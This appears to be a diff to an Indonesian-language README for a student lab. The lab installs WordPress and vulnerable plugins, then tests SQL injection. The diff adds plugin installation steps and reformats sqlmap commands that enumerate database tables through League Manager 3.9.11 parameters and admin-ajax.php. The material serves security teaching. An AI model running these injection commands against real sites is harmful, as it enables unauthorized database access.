@@ -51,7 +51,7 @@ define('WP_SITEURL', 'http://alamatip/nama_folder');
 - Simpan dan ubah nama menjadi **'wp-config.php'**.
 - Pada browser buka url yang telah di inputkan sebelumnya pada **'wp-config.php'**, seperti: <pre>
 http://192.168.100.19/wordpress/ -> (http://alamatip/nama_folder)
-</pre>
+</pre> dike
 
 - Pilih bahasa instalasi:
 
@@ -66,6 +66,24 @@ http://192.168.100.19/wordpress/ -> (http://alamatip/nama_folder)
 ![instalasi](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/step3.PNG)
 
 ### Langkah Instalasi Wordpress Plugin
+
+- Masuk pada halaman pengaturan wordpress melalui: <pre>http://alamatip/nama_folder/wp-login/ </pre>
+- Pilih tab plugin.
+
+![tab plugin](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/plugin1.PNG)
+
+- Pilih 'Add New'.
+- Pilih plugin yang dikehendaki untuk diinstal bila telah memiliki file plugin, maka pilih 'Upload File'.
+
+![upload file](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/plugin2.PNG)
+
+- Pilih 'Choose File' untuk memilih plugin yang tersimpan secara lokal. Kemudian pilih 'Install Now'.
+
+![choose file](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/plugin3.PNG)
+
+- Instalasi plugin akan berjalan. Plugin telah berhasil di install.
+
+![instalasi selesai](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/plugin4.PNG)
 
 ## Uji Coba
 
@@ -114,10 +132,12 @@ python sqlmap -u "http://alamat_site/wp-admin/admin-ajax.php"  --data="action=sp
 #### Plugin - League Manager 3.9.11
 - Buka terminal pada folder dimana sqlmap berada, jalankan perintah:<pre>
 python sqlmap.py --url "http://alamat_site?match=1" --level 5 --risk 3 --dbms mysql --tables
-</pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hasil:
-- atau::<pre>
+</pre>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hasil:
+- atau:<pre>
 python sqlmap.py --url "http://alamat_post_mengandung_plugin?league_id=1&season=Winter" --level 5 --risk 3 --dbms mysql --tables
-</pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hasil:
+</pre>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hasil:
 
 ## Kesimpulan dan Saran
 
